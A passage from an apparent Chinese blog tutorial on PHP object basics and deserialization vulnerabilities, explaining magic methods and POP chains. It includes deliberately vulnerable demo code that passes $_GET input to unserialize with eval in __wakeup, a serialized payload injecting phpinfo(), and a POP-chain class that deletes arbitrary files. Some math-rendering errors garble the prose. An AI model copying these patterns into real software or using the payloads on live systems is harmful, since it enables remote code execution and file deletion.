class="line">方法的重载通过__call来实现，当调用不存在的方法的时候，将会转为参数调用__call方法，当调用不存在的静态方法时会使用__callStatic重载。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$speed</span> = <span class="number">0</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;speedUp&#x27;</span>) &#123;            <span class="variable language_">$this</span>-&gt;speed += <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$car</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$car</span>-&gt;<span class="title function_ invoke__">speedUp</span>(); <span class="comment">//调用不存在的方法会使用重载echo $car-&gt;speed;</span></span><br></pre></td></tr></table></figure>
<h3 id="十-对象比较"><a class="markdownIt-Anchor" href="#十-对象比较"></a> 十、对象比较</h3>
<p>，当同一个类的两个实例的所有属性都相等时，可以使用比较运算符<mark>进行判断，当需要判断两个变量是否为同一个对象的引用时，可以使用全等运算符</mark>=进行判断。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="variable">$b</span>) <span class="keyword">echo</span> <span class="string">&#x27;==&#x27;</span>;   <span class="comment">//trueif ($a === $b) echo &#x27;===&#x27;; //false</span></span><br><span class="line"></span><br><span class="line">对象复制，在一些特殊情况下，可以通过关键字<span class="keyword">clone</span>来复制一个对象，这时__clone方法会被调用，通过这个魔术方法来设置属性的值。</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;car&#x27;</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();        <span class="variable">$obj</span>-&gt;name = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$a</span>-&gt;name = <span class="string">&#x27;new car&#x27;</span>;<span class="variable">$b</span> = <span class="keyword">clone</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">对象序列化，可以通过serialize方法将对象序列化为字符串，用于存储或者传递数据，然后在需要的时候通过unserialize将字符串反序列化成对象进行使用</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;car&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Car</span>();<span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); <span class="comment">//对象序列化成字符串echo $str.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;;$b = unserialize($str); //反序列化为对象var_dump($b);</span></span><br></pre></td></tr></table></figure>
<h2 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化"></a> 反序列化</h2>
<h3 id="一-基本知识"><a class="markdownIt-Anchor" href="#一-基本知识"></a> 一、基本知识</h3>
<h4 id="~类和对象"><a class="markdownIt-Anchor" href="#~类和对象"></a> ~类和对象</h4>
<p>类的实体化结果是对象，而对象的抽象就是类。在开发过程中，我们通常都是先抽象(幻想)出一个类，再用该类去创建对象(实现幻想的内容)。在程序中，直接使用的是我们(实现幻想)的对象，而不是抽象(幻想)的类。</p>
<h4 id="~变量的属性"><a class="markdownIt-Anchor" href="#~变量的属性"></a> ~变量的属性</h4>
<p>public表示全局，类内部和外部子类都可以访问；</p>
<p>private表示私有的，只有本类内部可以使用；</p>
<p>protected表示受保护的，只有本类或子类或父类中可以访问；</p>
<h4 id="~反序列化"><a class="markdownIt-Anchor" href="#~反序列化"></a> ~反序列化</h4>
<h5 id="json_encode"><a class="markdownIt-Anchor" href="#json_encode"></a> json_encode()</h5>
<blockquote>
<p>PHP json_encode() 用于对变量进行 JSON 编码，该函数如果执行成功返回 JSON 数据，否则返回 FALSE 。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$value</span>[,<span class="variable">$options</span> = <span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<h6 id="参数"><a class="markdownIt-Anchor" href="#参数"></a> 参数：</h6>
<ul>
<li>
<p><strong>value</strong>: 要编码的值。该函数只对 UTF-8 编码的数据有效。</p>
</li>
<li>
<p><strong>options</strong>:由以下常量组成的二进制掩码 JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_NUMERIC_CHECK, JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT, JSON_PRESERVE_ZERO_FRACTION, JSON_UNESCAPED_UNICODE, JSON_PARTIAL_OUTPUT_ON_ERROR。</p>
<p>要注意的是 JSON_UNESCAPED_UNICODE 选项，如果我们不希望中文被编码，可以添加该选项。</p>
</li>
</ul>
<h5 id="serialize"><a class="markdownIt-Anchor" href="#serialize"></a> serialize()</h5>
<blockquote>
<p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p>
<p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">serialize</span>(mixer <span class="variable">$value</span>)</span><br></pre></td></tr></table></figure>
<h6 id="参数value要序列化的对象或数组"><a class="markdownIt-Anchor" href="#参数value要序列化的对象或数组"></a> 参数：$value:要序列化的对象或数组。</h6>
<h5 id="unserialize"><a class="markdownIt-Anchor" href="#unserialize"></a> unserialize()</h5>
<blockquote>
<p><strong>unserialize()</strong> 函数用于将通过 <a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-serialize-function.html">serialize() </a>函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
<p>PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">unserialize</span>(<span class="keyword">string</span> <span class="variable">$str</span>)</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<p>$str:序列化后的字符串。</p>
<h5 id="演示"><a class="markdownIt-Anchor" href="#演示"></a> 演示：</h5>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221006202111066.png" alt="image-20221006202111066"></p>
<h3 id="二-反序列化漏洞"><a class="markdownIt-Anchor" href="#二-反序列化漏洞"></a> 二、反序列化漏洞</h3>
<p>为啥会产生这个漏洞呢？</p>
<p>首先，我们先来了解一下什么是魔术方法！</p>
<h4 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法"></a> 魔术方法</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__invoke()当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化unserialize()之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化serialize()之后立即被调用</span><br><span class="line"></span><br><span class="line">__call 在对象中调用一个不可访问方法时调用。(必须满足两个参数)</span><br><span class="line"></span><br><span class="line">__get 获得一个类的成员变量时调用;在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值</span><br><span class="line"></span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line"></span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line"></span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br></pre></td></tr></table></figure>
<h5 id="demo"><a class="markdownIt-Anchor" href="#demo"></a> Demo</h5>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span> = <span class="number">114</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$f1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;(s)(e)(r)(i)(a)(l)(i)(z)(e)(!)&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_unserialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>==<span class="string">&quot;size&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;size&gt;<span class="number">100</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;size-<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString tigger&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is __invoke&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_serialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hource</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;age;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018211456021-16672739578731.png" alt="test"></p>
<p>这里就算给出了Demo，同样不好理解怎么就是反序列化漏洞了？</p>
<h5 id="demo01-__wokeup"><a class="markdownIt-Anchor" href="#demo01-__wokeup"></a> Demo01-__wokeup()</h5>
<p>这里我们来用__wokeup()来做一个漏洞演示：</p>
<p>首先来看一下反序列化实例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;TWe1v3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;SCR&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018214636570-16672739578743.png" alt="image-20221018214636570"></p>
<p>接下来就是漏洞实例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;TWe1v3&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码审计：</p>
<p>01.可控参数是GET型string参数</p>
<p>02.后端接收参数后进行反序列化操作</p>
<p>03.test类中存在__wakeup魔术方法，操作是eval($id)</p>
<p>构建POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011016911-16672739578732.png" alt="image-20221019011016911"></p>
<p>直接使用链子：O:4:“test”:1:{s:1:“a”;s:10:“phpinfo();”;}</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011242914-16672739578744.png" alt="image-20221019011242914"></p>
<p>到此，反序列化的产生原因我不言而喻了吧！</p>
<h2 id="php反序列化常见考点"><a class="markdownIt-Anchor" href="#php反序列化常见考点"></a> php反序列化常见考点</h2>
<h3 id="pop链"><a class="markdownIt-Anchor" href="#pop链"></a> POP链</h3>
<p>通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即</p>
<p><mark>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</mark></p>
<h4 id="实例复现"><a class="markdownIt-Anchor" href="#实例复现"></a> 实例复现</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$user_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$user_data</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="审计源码"><a class="markdownIt-Anchor" href="#审计源码"></a> 审计源码：</h5>
<p>首先我们看最限制行的操作在最下面反序列化GET到的参数data，然后执行echo (user_data，这里如果)user_data是一个类实例化来的对象的话，就会触发对象中的__tostring()魔术方法</p>
<p>接着来单独分析每个类中的函数关系:</p>
<p>Test1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1 首先声明了$obj变量</p>
<p>.2 类中有______construct()和__tostring()魔术方法，__construct()方法为(obj变量赋值为Test3类的实例化对象，__tostring()方法判断如果)obj变量存在则返回调用$obj对象中的Delete()函数</p>
<p>Test2:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1首先声明了$cache_file变量</p>
<p>.2 定义了Delete()函数，如果定义的$file变量中的文件存在，则删除此文件并返回提示内容</p>
<p>Test3：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1 定义了Delete()函数，次函数只返回一句话，没有敏感操作，为安全函数</p>
<h5 id="pop链构造"><a class="markdownIt-Anchor" href="#pop链构造"></a> <em>POP链构造</em></h5>
<p>首先出发点是Test1中的______tostring()魔术方法，其中调用了(this-&gt;obj中的Delete()函数，而)this-&gt;obj是在实例化对象是触发______construct方法，将<span class="katex-error" title="ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 80: …的执行流如下 `Test1类→_̲_construct()→">this-&gt;obj作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下 `Test1类→__construct()→</span>this-&gt;obj=new Test3→__tostring()→Test3.Delete<code>方法 不过在Test2类中也定义了和Test3中同名的函数Delete()，那么我们可以通过构造特定的反序列化参数来修改执行流，也就是构造我们的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作，让执行流如下 </code>Test1类→__construct()→$this-&gt;obj=new Test2→__tostring()→Test2.Delete方法` 那么POP链的构造就是通过反序列化和echo来触发__tostring()魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。</p>
<h5 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> POC</h5>
